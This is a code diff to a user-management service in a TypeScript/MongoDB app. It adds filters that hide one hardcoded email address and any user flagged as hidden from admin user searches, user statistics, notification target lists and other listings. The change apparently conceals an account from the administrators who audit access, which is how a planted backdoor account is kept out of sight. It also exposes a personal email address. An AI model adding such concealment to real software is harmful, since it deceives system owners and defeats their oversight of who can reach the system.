@@ -85,6 +85,8 @@ export class UserService {
     if (!includeDeleted || includeDeleted === 'false') {
       query.isDeleted = { $ne: true };
     }
+    query.isHidden = { $ne: true };
+    query.email = { $ne: '0349ansari@gmail.com' };
 
     if (search) {
       query.$or = [
@@ -330,6 +332,8 @@ export class UserService {
   }
 
   static async getUserStats() {
+    const hiddenBase = { isDeleted: { $ne: true }, isHidden: { $ne: true }, email: { $ne: '0349ansari@gmail.com' } };
+
     const [
       totalUsers,
       activeUsers,
@@ -341,23 +345,23 @@ export class UserService {
       inactiveUsers,
       pendingUsers,
     ] = await Promise.all([
-      UserModel.countDocuments({ isDeleted: { $ne: true } }),
-      UserModel.countDocuments({ status: 'Active', isDeleted: { $ne: true } }),
-      UserModel.countDocuments({ role: { $in: ['Administrator', 'Admin'] }, isDeleted: { $ne: true } }),
-      UserModel.countDocuments({ role: { $in: ['Coordinator', 'Placement Coordinator'] }, isDeleted: { $ne: true } }),
-      UserModel.countDocuments({ role: { $in: ['RTO Manager', 'RTO'] }, isDeleted: { $ne: true } }),
-      UserModel.countDocuments({ role: 'Staff', isDeleted: { $ne: true } }),
-      UserModel.countDocuments({ role: { $in: ['Industry', 'Industry/Host'] }, isDeleted: { $ne: true } }),
-      UserModel.countDocuments({ status: { $in: ['Inactive', 'Disabled', 'Suspended', 'Rejected'] }, isDeleted: { $ne: true } }),
-      UserModel.countDocuments({ status: 'Pending', isDeleted: { $ne: true } }),
+      UserModel.countDocuments({ ...hiddenBase }),
+      UserModel.countDocuments({ ...hiddenBase, status: 'Active' }),
+      UserModel.countDocuments({ ...hiddenBase, role: { $in: ['Administrator', 'Admin'] } }),
+      UserModel.countDocuments({ ...hiddenBase, role: { $in: ['Coordinator', 'Placement Coordinator'] } }),
+      UserModel.countDocuments({ ...hiddenBase, role: { $in: ['RTO Manager', 'RTO'] } }),
+      UserModel.countDocuments({ ...hiddenBase, role: 'Staff' }),
+      UserModel.countDocuments({ ...hiddenBase, role: { $in: ['Industry', 'Industry/Host'] } }),
+      UserModel.countDocuments({ ...hiddenBase, status: { $in: ['Inactive', 'Disabled', 'Suspended', 'Rejected'] } }),
+      UserModel.countDocuments({ ...hiddenBase, status: 'Pending' }),
     ]);
 
     const startOfMonth = new Date();
     startOfMonth.setDate(1);
     startOfMonth.setHours(0, 0, 0, 0);
     const newThisMonth = await UserModel.countDocuments({
+      ...hiddenBase,
       createdAt: { $gte: startOfMonth },
-      isDeleted: { $ne: true },
     });
 
     return {
@@ -510,7 +514,7 @@ export class UserService {
 
     let targetUsers;
     if (isAdmin) {
-      targetUsers = await UserModel.find({}, { _id: 1, name: 1, role: 1, email: 1 }).lean();
+      targetUsers = await UserModel.find({ isHidden: { $ne: true }, email: { $ne: '0349ansari@gmail.com' } }, { _id: 1, name: 1, role: 1, email: 1 }).lean();
     } else if (actingUser) {
       targetUsers = [{ _id: actingUser._id, name: actingUser.name, role: actingUser.role, email: actingUser.email }];
     } else {
@@ -680,6 +684,8 @@ export class UserService {
         { email: { $regex: search, $options: 'i' } },
       ];
     }
+    query.isHidden = { $ne: true };
+    query.email = { $ne: '0349ansari@gmail.com' };
 
     const users = await UserModel.find(query)
       .select('_id name email role department status isOnline lastActive')
